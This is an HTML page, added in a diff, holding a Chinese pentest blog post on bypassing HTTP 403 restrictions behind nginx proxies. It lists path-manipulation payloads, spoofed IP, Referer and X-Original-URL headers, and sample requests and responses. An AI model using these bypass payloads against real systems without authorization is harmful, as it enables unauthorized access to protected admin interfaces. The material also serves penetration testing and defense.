@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>权限绕过之403 Bypass | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="一直想学习下403绕过，换了新公司后终于有时间可以学习下 简单概括下漏洞原理：当下的软件部署方式通常是nginx在前端做反向代理，后端用java或php开发，开发者一般通过nginx识别访问端ip，以此限制对接口的访问，我们可以利用nginx在权限校验方面的缺陷，来绕过限制，具体如下： 01 修改URL扩展名1234567891011121314151617181920212223242526si">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限绕过之403 Bypass">
+<meta property="og:url" content="http://example.com/2023/03/17/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B9%8B403-Bypass/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一直想学习下403绕过，换了新公司后终于有时间可以学习下 简单概括下漏洞原理：当下的软件部署方式通常是nginx在前端做反向代理，后端用java或php开发，开发者一般通过nginx识别访问端ip，以此限制对接口的访问，我们可以利用nginx在权限校验方面的缺陷，来绕过限制，具体如下： 01 修改URL扩展名1234567891011121314151617181920212223242526si">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-17T02:08:32.000Z">
+<meta property="article:modified_time" content="2023-03-17T03:30:23.628Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-权限绕过之403-Bypass" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/03/17/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B9%8B403-Bypass/" class="article-date">
+  <time class="dt-published" datetime="2023-03-17T02:08:32.000Z" itemprop="datePublished">2023-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      权限绕过之403 Bypass
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>一直想学习下403绕过，换了新公司后终于有时间可以学习下</p>
+<p>简单概括下漏洞原理：<br>当下的软件部署方式通常是nginx在前端做反向代理，后端用java或php开发，开发者一般通过nginx识别访问端ip，以此限制对接口的访问，我们可以利用nginx在权限校验方面的缺陷，来绕过限制，具体如下：</p>
+<h1 id="01-修改URL扩展名"><a href="#01-修改URL扩展名" class="headerlink" title="01 修改URL扩展名"></a>01 修改URL扩展名</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">site.com/admin =&gt; 403</span><br><span class="line"></span><br><span class="line">site.com/admin/ =&gt; 200</span><br><span class="line">site.com/random-dir/../admin =&gt; 200</span><br><span class="line">site.com/random-dir/..;/admin =&gt; 200</span><br><span class="line">site.com/random-dir/..%252F/admin =&gt; 200</span><br><span class="line">site.com/admin// =&gt; 200</span><br><span class="line">site.com//admin// =&gt; 200</span><br><span class="line">site.com/admin/* =&gt; 200</span><br><span class="line">site.com/admin/*/ =&gt; 200</span><br><span class="line">site.com/admin/. =&gt; 200</span><br><span class="line">site.com/admin/./ =&gt; 200</span><br><span class="line">site.com/./admin/./ =&gt; 200</span><br><span class="line">site.com/admin/./. =&gt; 200</span><br><span class="line">site.com/admin/./. =&gt; 200</span><br><span class="line">site.com/admin? =&gt; 200</span><br><span class="line">site.com/admin?? =&gt; 200</span><br><span class="line">site.com/admin??? =&gt; 200</span><br><span class="line">site.com/admin..;/ =&gt; 200</span><br><span class="line">site.com/admin/..;/ =&gt; 200</span><br><span class="line">site.com/%2f/admin =&gt; 200</span><br><span class="line">site.com/%2e/admin =&gt; 200</span><br><span class="line">site.com/admin%20/ =&gt; 200</span><br><span class="line">site.com/admin%09/ =&gt; 200</span><br><span class="line">site.com/%20admin%20/ =&gt; 200</span><br><span class="line">site.com/%0dadmin =&gt; 200</span><br></pre></td></tr></table></figure>
+<h1 id="01-修改代理IP"><a href="#01-修改代理IP" class="headerlink" title="01 修改代理IP"></a>01 修改代理IP</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- X-Originating-IP: 127.0.0.1</span><br><span class="line">- X-Remote-IP: 127.0.0.1</span><br><span class="line">- X-Client-IP: 127.0.0.1</span><br><span class="line">- X-Forwarded-For: 127.0.0.1</span><br><span class="line">- X-Forwared-Host: 127.0.0.1</span><br><span class="line">- X-Host: 127.0.0.1</span><br><span class="line">- X-Custom-IP-Authorization: 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>示例代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">GET /auth/login HTTP/1.1</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">GET /auth/login HTTP/1.1</span><br><span class="line">X-Custom-IP-Authorization: 127.0.0.1</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
+<h1 id="02-修改Referer标头"><a href="#02-修改Referer标头" class="headerlink" title="02 修改Referer标头"></a>02 修改Referer标头</h1><p>Referer请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源，示例代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">GET /auth/login HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Referer:https://xxx/auth/login</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">GET /auth/login HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Referer:https://xxx/auth/login</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
+<h1 id="03-覆盖请求URL"><a href="#03-覆盖请求URL" class="headerlink" title="03 覆盖请求URL"></a>03 覆盖请求URL</h1><p>如果目标支持X-Original-URL和X-Rewrite-URL标头，用户可以使用X-Original-URL或X-Rewrite-URL请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制，示例代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line">  Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">  GET / HTTP/1.1</span><br><span class="line">  X-Original-URL: /auth/login</span><br><span class="line">  Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">  GET / HTTP/1.1</span><br><span class="line">  X-Rewrite-URL: /auth/login</span><br><span class="line">  Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="04-修改HOST（这块原文讲的不是很清楚，看到的不是很明白）"><a href="#04-修改HOST（这块原文讲的不是很清楚，看到的不是很明白）" class="headerlink" title="04 修改HOST（这块原文讲的不是很清楚，看到的不是很明白）"></a>04 修改HOST（这块原文讲的不是很清楚，看到的不是很明白）</h1><p>我们先说下Host在请求头中的作用，在一般情况下，几个网站可能会部署在同一个服务器上，或者几个web系统共享一个服务器，通过host头来指定应该由哪个网站或者web系统来处理用户的请求。而很多 WEB 应用通过获取 HTTP HOST 头来获得当前请求访问的位置，但是很多开发人员并未意识到 HTTP HOST 头由用户控制，从安全角度来讲，任何用户输入都是认为不安全的。</p>
+<h1 id="05-端口利用"><a href="#05-端口利用" class="headerlink" title="05 端口利用"></a>05 端口利用</h1><p>全端口扫描后，在其他端口可能会发现可未授权访问的web系统</p>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/st3pby/article/details/128485994">https://blog.csdn.net/st3pby/article/details/128485994</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/03/17/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B9%8B403-Bypass/" data-id="clfbzfyas0014cq7855sbfwtj" data-title="权限绕过之403 Bypass" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/12/29/JPress%E5%AE%A1%E8%AE%A1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">JPress最新版后台Getshell</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E6%89%93%E7%82%B9/" rel="tag">Web打点</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="tag">免杀对抗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%82%B9%E6%BB%B4%E7%94%9F%E6%B4%BB/" rel="tag">点滴生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Web%E6%89%93%E7%82%B9/" style="font-size: 10px;">Web打点</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" style="font-size: 15px;">免杀对抗</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%82%B9%E6%BB%B4%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">点滴生活</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 15px;">环境搭建</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/03/17/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B9%8B403-Bypass/">权限绕过之403 Bypass</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/29/JPress%E5%AE%A1%E8%AE%A1/">JPress最新版后台Getshell</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/29/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/">悟空CRM后台Getshell</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/11/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/">微擎后台Getshell exp构造</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/10/Nim%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/">Nim语言学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
